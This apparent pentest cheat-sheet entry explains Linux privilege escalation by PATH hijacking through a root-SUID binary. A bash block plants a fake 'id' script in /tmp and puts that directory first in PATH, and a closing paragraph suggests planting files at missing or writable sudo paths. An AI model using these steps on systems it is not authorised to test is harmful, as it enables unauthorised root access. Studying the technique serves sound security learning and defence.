# PATH Hijack via SUID Binary

If a root-SUID binary calls another command by name (not full path, e.g. plain `id`), plant a fake version of that command earlier in `$PATH`.

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=0(root) gid=0(root) groups=0(root)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
/path/to/suid-binary    # now runs your fake id instead of the real one
```

Check with `strings`/`ltrace` for any unqualified command names the binary shells out to.

Same idea applies to `sudo`: if `sudo -l` grants a binary that lives at a path which doesn't exist yet, or a `secure_path` includes a directory you can write to, just plant the file yourself rather than looking for an existing misconfiguration to abuse.
